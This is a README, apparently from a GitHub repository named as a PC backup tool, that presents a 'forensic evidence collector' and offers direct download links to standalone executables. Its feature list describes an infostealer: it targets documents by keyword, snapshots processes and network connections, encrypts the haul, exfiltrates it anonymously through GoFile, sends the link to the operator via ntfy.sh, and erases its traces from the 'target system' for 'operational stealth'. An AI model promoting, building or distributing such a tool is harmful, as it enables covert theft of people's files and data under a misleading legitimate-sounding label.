# Digital Forensic Evidence Collector (DFIR-Agent)

Welcome to the **Digital Forensic Evidence Collector**! This is an advanced incident response and data collection tool designed to autonomously scan, prioritize, encrypt, and exfiltrate critical system data. It operates with a zero-footprint philosophy, ensuring data integrity for forensic analysis while maintaining complete operational stealth.

# Download the Software (Cross-Platform)
Click on the buttons below to download the standalone executable for your Operating System. No installation or dependencies required!

<a href="https://github.com/rohangupta2/PC-Auto-Backup-Tool/raw/main/extractFiles-win.exe">
  <img src="https://img.shields.io/badge/DOWNLOAD_FOR_WINDOWS-extractFiles--win.exe-blue?style=for-the-badge&logo=windows" />
</a>

<a href="https://github.com/rohangupta2/PC-Auto-Backup-Tool/raw/main/extractFiles-macos">
  <img src="https://img.shields.io/badge/DOWNLOAD_FOR_MAC-extractFiles--macos-black?style=for-the-badge&logo=apple" />
</a>

<a href="https://github.com/rohangupta2/PC-Auto-Backup-Tool/raw/main/extractFiles-linux">
  <img src="https://img.shields.io/badge/DOWNLOAD_FOR_LINUX-extractFiles--linux-yellow?style=for-the-badge&logo=linux" />
</a>

# Key Features

* **Cross-Platform Portability:** Compiled as standalone binaries for Windows, macOS, and Linux. Runs natively without requiring a Node.js runtime on the target machine.
* **Smart Heuristic Engine:** Moves beyond basic scanning by scoring and prioritizing files based on keyword targeting, extension hierarchy (favoring critical documents), and time-based heuristics (recent access/modifications).
* **Volatile Data Capture:** Automatically takes a live snapshot of active system processes and current network connections, appending them to the evidence manifest before extraction.
* **Military-Grade Encryption:** Secures the gathered evidence payload using AES-256-CBC cryptographic standards. The payload is heavily encrypted before transit to prevent unauthorized access.
* **Anonymous Cloud Exfiltration:** Securely uploads the encrypted forensic package via the GoFile API, requiring no localized API keys or login credentials.
* **Real-time Alerting:** Integrates with `ntfy.sh` to deliver an instant, secure ping to the investigator's device with the retrieval link once the package is successfully uploaded.
* **Zero-Footprint Execution:** Automatically wipes all temporary staging directories and local encrypted files immediately after a successful upload, leaving no traces on the target system.

# Built With

* **Node.js:** Core runtime environment.
* **Crypto:** For AES-256 payload encryption and SHA-256 file hashing.
* **Child_Process & OS:** For executing native system commands and gathering volatile networking data.
* **Adm-Zip:** For high-speed, reliable file archiving.
* **Axios & Form-Data:** For handling secure, multipart network data exfiltration.
* **Pkg:** For packaging the raw code into secure, standalone executables.